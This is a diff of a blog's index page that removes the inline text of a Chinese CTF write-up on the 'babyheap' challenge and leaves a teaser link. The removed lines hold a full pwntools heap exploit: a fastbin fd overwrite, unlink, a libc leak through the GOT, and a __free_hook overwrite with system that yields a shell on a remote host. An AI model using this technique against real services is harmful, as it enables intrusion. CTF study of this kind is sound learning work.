@@ -82,27 +82,18 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/21/fastbin_unlink/" data-id="cjl3cd0w40001dctieirpi9dd" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/21/fastbin_unlink/" data-id="cjl3cgn830001toti18sxat5z" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <a id="more"></a>
-<p><strong>网鼎杯babyheap WP</strong><br><strong>核心思路就是：</strong>先通过malloc 3个堆快(内容设置为P64(\x31)*3+”\x31”过掉fastbin分配时的检验),再free掉，通过show泄露出堆地址，再用edit函数更改fastbin的fd指针使新分配的fastbin能够覆盖下个堆快的size位为0x101（设此伪造的堆快为堆快一)，用malloc分配4个堆快，第四个堆快的内容设置为p64(0)+p64(0x31)+p64(fd)+p64(bk),(fd,bk分别为该堆快的UAF指针地址-0x18,-0x10),再更改第四个堆快下一个堆快的内容为p64(0x30),p64(0x100),这时再free堆快一就会向后合并触发Unlink更改第四个堆快的UAF指针为&amp;UAF-0x18，这时还有两次edit的机会正好可以用于任意地址写，用这两次机会把edit的次数检验给过掉，此时可以无限edit，用show(got[‘free’])泄露Libc基址计算出system地址再把free_hook改写为ststem的地址,free一个内容为/bin/sh的堆快就可以getshell了<br>三个函数<br>def addnote(num,size,content=””):<br>    f.sendlineafter(“Choice:”,”1”)<br>    f.sendlineafter(“Index:”,str(num))<br>    f.sendlineafter(“Content:”,content)<br>    print “addnote done”</p>
-<p>def deletenote(num):<br>f.sendlineafter(“Choice:”,”4”)<br>f.sendlineafter(“Index:”,str(num))<br>print “deletenote done”<br>def editnote(num,sentence):<br>f.sendlineafter(“Choice:”,”2”)<br>f.sendlineafter(“Index:”,str(num))<br>f.sendlineafter(“Content:”,sentence)<br>print “editnote done”</p>
-<p>def shownote(num):<br>f.sendlineafter(“Choice:”,”3”)<br>f.sendlineafter(“Index:”,str(num))<br>i=f.recvline()<br>i=i.replace(“\n”,””)<br>print “shownote done”<br>return u64(i+”\x00”<em>(8-len(i)))<br><strong>第一步：leak chunk的地址</strong><br>addnote(0,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(1,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(2,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(3,0x20,”/bin/sh\0”)<br>addnote(6,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(7,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(9,0x20,p64(0)+p64(0x31)+p64(0x602060+0x8</em>9-24)+”\x98\x20\x60”)<br>addnote(8,0x20,p64(0x30)+p64(0x100))<br>deletenote(0)<br>deletenote(1)<br>deletenote(2)<br>chunk_head=shownote(2)<br>print (“chunkhead is”,(hex(chunk_head)))<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/1.png" alt="enter description here"></p>
-<p><strong>第二步: 伪造触发unlink（部分内容在步骤一adddnote时已经添加，节省edit次数</strong>)</p>
-<p>#malloc to bss<br>editnote(2,p64(chunk_head-0x20)+p64(0x31))<br>addnote(4,0x20)<br>addnote(5,0x20,”\x11”*16+p64(0)+”\x01\x01\x00”)</p>
-<p>#因为最大输入大小为31所以最后不能用p64(0x101)</p>
-<p>#gdb.attach(f)<br>Deletenote(1)<br>此时堆中的情况如下图:<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/2.png" alt="enter description here" title="2"><br>free后bss段的情况如下图:<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/3.png" alt="enter description here" title="3"><br><strong>第三步:二次edit改写0x602060的值为5实现无限edit</strong><br>deletenote(1)<br>editnote(9,p64(0x601f98)+p64(0x6020b0))<br>editnote(7,p64(4))<br>改写后bss段如下图:<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/4.png" alt="enter description here" title="4"><br><strong>第四步:show(got[‘free’])leak libc基址，并改写free_hook为ststem地址</strong><br>free_addr=shownote(6)<br>print hex(free_addr)<br>libc_base=free_addr-libc.symbols[‘free’]<br>system=libc_base+libc.symbols[‘system’]<br>free_hook=libc_base+libc.symbols[‘__free_hook’]<br>editnote(9,p64(free_hook))<br>editnote(6,p64(system))<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/5.jpg" alt="enter description here" title="5"><br>改写后free_hook处的值如下图:<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/6.png" alt="enter description here" title="6"></p>
-<p><strong>第五步:system(‘/bin/sh’)</strong><br>f.sendline(‘4’)<br>f.recv()<br>f.sendline(‘3’)<br><img src="/2018/08/21/fastbin_unlink/./fastbin_unlink/8.png" alt="enter description here" title="8"><br>远程服务器关了，只能本地进行<br><strong>完整exp</strong></p>
-<p>#!/usr/bin/python<br>from pwn import *</p>
-<p>#f = process(‘./aa’)<br>f=remote(“106.75.67.115”,9999)</p>
-<p>#libc=ELF(‘./libc.so.6’)<br>libc=ELF(‘./libc.so.5’)<br>def addnote(num,size,content=””):<br>    f.sendlineafter(“Choice:”,”1”)<br>    f.sendlineafter(“Index:”,str(num))<br>    f.sendlineafter(“Content:”,content)<br>    print “addnote done”<br>def deletenote(num):<br>    f.sendlineafter(“Choice:”,”4”)<br>    f.sendlineafter(“Index:”,str(num))<br>    print “deletenote done”<br>def editnote(num,sentence):<br>    f.sendlineafter(“Choice:”,”2”)<br>    f.sendlineafter(“Index:”,str(num))<br>    f.sendlineafter(“Content:”,sentence)<br>    print “editnote done”<br>def shownote(num):<br>    f.sendlineafter(“Choice:”,”3”)<br>    f.sendlineafter(“Index:”,str(num))<br>    i=f.recvline()<br>    i=i.replace(“\n”,””)<br>    print “shownote done”<br>    return u64(i+”\x00”*(8-len(i)))</p>
-<p>#leak heap_addr<br>addnote(0,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(1,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(2,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(3,0x20,”/bin/sh\0”)<br>addnote(6,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(7,0x20,p64(0x0)+p64(0x31)+p64(0x31)+”\x31”)<br>addnote(9,0x20,p64(0)+p64(0x31)+p64(0x602060+0x8*9-24)+”\x98\x20\x60”)<br>addnote(8,0x20,p64(0x30)+p64(0x100))<br>deletenote(0)<br>deletenote(1)<br>deletenote(2)<br>chunk_head=shownote(2)<br>print (“chunkhead is”,(hex(chunk_head)))</p>
-<p>#malloc to bss<br>editnote(2,p64(chunk_head-0x20)+p64(0x31))<br>addnote(4,0x20)<br>addnote(5,0x20,”\x11”*16+p64(0)+”\x01\x01\x00”)<br>deletenote(1)<br>editnote(9,p64(0x601f98)+p64(0x6020b0))<br>editnote(7,p64(4))<br>free_addr=shownote(6)<br>print hex(free_addr)<br>libc_base=free_addr-libc.symbols[‘free’]<br>system=libc_base+libc.symbols[‘system’]<br>free_hook=libc_base+libc.symbols[‘__free_hook’]<br>editnote(9,p64(free_hook))<br>editnote(6,p64(system))<br>f.sendline(‘4’)<br>f.recv()<br>f.sendline(‘3’)<br>f.interactive()<br>水平太差，做到晚上9点多才做出来,要是早点做出来就能去打线下了</p>
-
+        <p>精心的构造<br></p>
+        
+          <p class="article-more-link">
+            <a href="/2018/08/21/fastbin_unlink/#more" class="more-link">More <span class="meta-nav">→</span></a>
+          </p>
+        
       
     </div><!-- .entry-content -->
 
@@ -138,7 +129,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/04/doublefree/" data-id="cjl3cd0vy0000dcti1yfyik4m" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/04/doublefree/" data-id="cjl3cgn7y0000totilsc473a2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
